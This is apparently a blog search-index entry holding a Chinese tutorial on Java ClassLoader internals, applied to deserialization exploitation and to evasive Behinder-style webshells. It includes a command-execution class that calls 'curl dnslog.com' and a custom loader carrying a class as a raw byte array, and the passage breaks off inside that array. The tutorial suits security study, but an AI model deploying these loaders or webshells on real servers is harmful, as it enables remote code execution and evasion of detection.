<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java代码审计： ClassLoader应用</title>
      <link href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/"/>
      <url>/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>首先说明一下为啥要搞这个？</p><p>1、挖洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如挖洞的时候遇到反序列化，一般都是cc回显是将构造的回显类塞进TemplatesImpl中，如果禁用了就得找其他的方法，一般都是找ClassLoader的子类，并且实现defineClass的类。</span><br></pre></td></tr></table></figure><p>2、webshell对抗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似于冰蝎的webshell也是使用自定义的ClassLoader，下面讲的方法都可以转化为webshell，这种特征都不台明显，有一定的迷惑性。</span><br></pre></td></tr></table></figure><p>3、漏洞利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是在漏洞回显方面的问题，一般多利用 TemplatesImpl 和BECL 可以直接塞入payload直接攻击，比如常见的fastjson</span><br></pre></td></tr></table></figure><p>总的来说用的场景还是蛮多的，比较实用的。</p><h1 id="0x01-Java类基本使用"><a href="#0x01-Java类基本使用" class="headerlink" title="0x01 Java类基本使用"></a>0x01 Java类基本使用</h1><p>Java是编译型语言</p><p>Java是一个底层是一个<code>JVM</code>（Java虚拟机）驱动实现的跨平台的开发语言。</p><p>1、Java程序在运行前需要先编译成<code>class文件</code>。</p><p>2、Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码</p><p>3、<code>ClassLoader</code>会调用JVM（<code>defineClass0/defineClass1/defineClass2</code>）native方法来定义一个实例。</p><p>（native方法就是本地方法，底层是C写的了，我们在代码层就看不到了）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/13313bda25f39174dac8bf18b5404b6c.png" alt="image-20220509115045243"></p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h2><blockquote><p>引用园长的文章，写的很好了：</p><p>理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习<code>ClassLoader</code>。</p><p><code>ClassLoader</code>加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类重要流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.anbai.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol></blockquote><h1 id="0x02-自定义ClassLoader"><a href="#0x02-自定义ClassLoader" class="headerlink" title="0x02 自定义ClassLoader"></a>0x02 自定义ClassLoader</h1><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，所以我们要实现一个自定义的<code>ClassLoader</code>加载器就可以直接继承就好。然后重写了<code>findClass</code>或<code>defineClass</code>者方法就好了</p><p>下面写一个自定义加载器实现命令执行。</p><p>首先写一个简单的命令执行方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> BufferedReader <span class="title">execute</span><span class="params">(String args)</span> </span>&#123;</span><br><span class="line">String command = args;</span><br><span class="line"> String osName  = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> <span class="keyword">if</span> (osName.startsWith(<span class="string">"Windows"</span>)) &#123;</span><br><span class="line"> command = <span class="string">"calc"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">"Linux"</span>)) &#123;</span><br><span class="line">  command = <span class="string">"curl dnslog.com"</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Process process = Runtime.getRuntime().exec(command);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">//取得命令结果的输出流</span></span><br><span class="line">InputStream inputStream = process.getInputStream();</span><br><span class="line"><span class="comment">//用一个读输出流类去读</span></span><br><span class="line">InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(inputStream, StandardCharsets.UTF_8);</span><br><span class="line"><span class="comment">//用缓冲器读行</span></span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> br;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验时要注意，测试的时候要把写好的Command代码都注释了再进行类加载。</p><p>因为如果这个类存在于我们的<code>classpath</code>中，就会直接调用了，不会进入我们的自定义类加载器中！</p><p>只有注释了，这个类不存在了才会进入自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法，然后去调用native方法加载这个传入的类。</p><p>下面是例示代码</p><p><strong>ZeoClassLoader示例代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZeoClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要加载的类名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TEST_CLASS_NAME = <span class="string">"com.classloader.Command"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要加载的类字节码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] TEST_CLASS_BYTES = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">98</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">87</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">115</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">58</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span 